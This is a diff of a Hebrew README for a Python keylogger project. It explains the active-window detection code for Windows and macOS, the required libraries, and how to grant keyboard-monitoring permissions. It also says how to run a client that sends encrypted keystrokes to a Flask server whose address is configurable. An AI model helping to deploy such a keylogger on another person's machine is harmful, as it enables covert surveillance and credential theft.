@@ -37,13 +37,13 @@ individualUinit.html: ממשק למכונה אחת: חיפוש בלוגים (ל�
 בקוד keylogger.py, בפונקציה get_active_application() (שמחזירה את שם האפליקציה הפעילה), יש התאמה לפלטפורמות:
 
 ל-Windows: הקוד מקומנט (מושבת עם #), ומשתמש בספריית win32gui כדי לקבל את חלון החזית (GetForegroundWindow) ולשלוף את שמו. אם תרצה להפעיל, הסר את ה-# משורות 56-59:
-textif platform.system() == "Windows":
+pythonif platform.system() == "Windows":
     import win32gui
     hwnd = win32gui.GetForegroundWindow()
     return win32gui.GetWindowText(hwnd) or "Unknown"
 זה יעבוד רק ב-Windows, ודורש התקנת win32gui (ראה להלן).
 ל-macOS (Darwin): הקוד פעיל (שורות 60-63), ומשתמש בספריית AppKit (חלק מ-pyObjC) כדי לקבל את האפליקציה הפעילה דרך NSWorkspace.
-textif platform.system() == "Darwin":
+pythonif platform.system() == "Darwin":
     from AppKit import NSWorkspace
     active_app = NSWorkspace.sharedWorkspace().activeApplication()
     return active_app.get("NSApplicationName", "Unknown")
@@ -51,15 +51,44 @@ textif platform.system() == "Darwin":
 
 ההחלפה הזו נובעת מהבדלים במערכות ההפעלה: Windows משתמש ב-API Win32, macOS ב-API Cocoa. הפרויקט מוטה ל-macOS (Windows מקומנט), אז אם אתה רוצה תמיכה מלאה, הפעל את קטע Windows והתקן ספריות מתאימות. ל-Linux אין תמיכה כלל (תצטרך להוסיף, למשל עם xdotool או pyxhook).
 
-ספריות נדרשות להתקנה
-לריצה מלאה, התקן:
-bashpip install pynput requests cryptography flask
+דרישות והתקנות
+דרישות כלליות
 
-עבור macOS, הוסף:
+Python 3.6+ (בגלל cryptography ו-Fernet).
+אין דרישות נוספות כמו מסדי נתונים או כלים חיצוניים.
+
+ספריות נדרשות (חיצוניות)
+התקן את הספריות הבאות באמצעות pip install <library>:
+
+pynput: להאזנה למקלדת.
+requests: לשליחת HTTP requests.
+cryptography: להצפנה/פענוח.
+flask: לשרת Flask.
+
+פקודה להתקנה בסיסית:
+bashpip install pynput requests cryptography flask
+התאמות לפלטפורמה
+
+macOS:
+
+התקן pyobjc (עבור AppKit):
 bashpip install pyobjc
 
-עבור Windows (אם מפעילים את קוד ה-win32gui):
+ודא הרשאות למקלדת (ב-Privacy & Security > Input Monitoring).
+
+
+Windows:
+
+אם מפעילים את קוד ה-Windows (הסרת # משורות 56-59 ב-keylogger.py), התקן pywin32 (עבור win32gui):
 bashpip install pywin32
 
+ייתכן צורך בהרשאות admin.
 
-כללי: אין התקנת ספריות נוספות ב-runtime (הקוד לא משתמש ב-pip בתוך עצמו). ודא Python 3.6+ (Fernet דורש זאת). לריצה: הרץ python app.py לשרת, python keylogger.py ל-client.
+
+ספריות סטנדרטיות: time, json, threading, os, platform – מגיעות עם Python, אין צורך להתקין.
+
+אין ספריות נוספות בקוד, ואין התקנות דינמיות. אם אתה מתכוון להשתמש רק ב-macOS (כפי שהקוד מוגדר כרגע), אין צורך ב-pywin32.
+ריצה
+
+הפעלת השרת: python app.py (פועל על http://127.0.0.1:5000).
+הפעלת ה-client: python keylogger.py (מתחבר לשרת מקומי, ניתן לשנות ב-server_base).
